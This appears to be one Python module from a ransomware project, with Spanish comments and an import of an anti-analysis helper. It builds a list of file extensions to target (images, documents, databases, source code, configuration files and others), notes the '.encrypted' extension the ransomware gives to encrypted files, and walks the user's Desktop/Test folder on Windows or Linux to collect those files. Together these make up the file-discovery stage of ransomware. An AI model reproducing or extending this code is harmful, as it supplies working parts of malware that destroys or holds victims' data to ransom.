import os
from antianalysis import so_detection

def is_important_file(file):
    extensions = { # Diccionario con categorías de archivos y sus extensiones correspondientes
        'images': ['.jpg', '.jpeg', '.png', '.gif', '.bmp', '.tiff', '.webp', '.svg', '.ico', '.heif', '.heic'],
        'videos': ['.mp4', '.avi', '.mov', '.mkv', '.webm', '.flv', '.wmv', '.3gp', '.mpeg', '.mpg'],
        'music': ['.mp3', '.wav', '.flac', '.aac', '.ogg', '.wma', '.m4a', '.aiff', '.alac'],
        'documents': ['.pdf', '.doc', '.docx', '.odt', '.txt', '.rtf', '.xls', '.xlsx', '.ppt', '.pptx', '.csv', '.md'],
        'databases': ['.db', '.sqlite', '.sql', '.mdb', '.accdb', '.json', '.xml'],
        'compressed_files': ['.zip', '.rar', '.7z', '.tar', '.gz', '.tar.gz', '.bz2', '.xz', '.cab'],
        'executable_files': ['.exe', '.msi', '.bat', '.sh', '.apk', '.jar', '.bin', '.deb', '.rpm'],
        'code_files': ['.py', '.java', '.c', '.cpp', '.cs', '.js', '.html', '.css', '.php', '.swift', '.go', '.rs', '.ts'],
        'configuration_files': ['.ini', '.cfg', '.json', '.yaml', '.yml', '.toml', '.env'],
        'design_files': ['.psd', '.ai', '.xd', '.fig', '.sketch'],
        'encrypted_extension': ['.encrypted'] # Extensión archivos cifrados por el ransomware
    }
    _, extension = os.path.splitext(file) # Extraer extensión del archivo
    is_important = any(extension.lower() in ext_list for ext_list in extensions.values()) # Verificar si la extensión coincide 
    return is_important # Devolver True o False para saber si es importante

def find_files(): # Función que obtiene el directorio y lo pasa a walk_directory
    so = so_detection()
    if so == "Windows":
        directorio_base = os.environ.get('USERPROFILE', None)
    elif so == "Linux":
        directorio_base = os.environ.get('HOME', None)
    if not directorio_base:
        return "No se ha encontrado el directorio en la variable de entorno."
    directorio = os.path.join(directorio_base, 'Desktop', 'Test')
    files = walk_directory(directorio)
    return files

def walk_directory(directory): # Recorre un directorio y devuelve los archivos importantes 
    important_files = []
    for root, _, files in os.walk(directory): # Recorrer directorio de manera recursiva
        for file in files:
            if is_important_file(file):  # Verificar si el archivo es importante 
                important_files.append(os.path.join(root, file)) # Agregar ruta completa del archivo a la lista
    return important_files # Devuelve una lista con la ruta absoluta de los archivos importantes


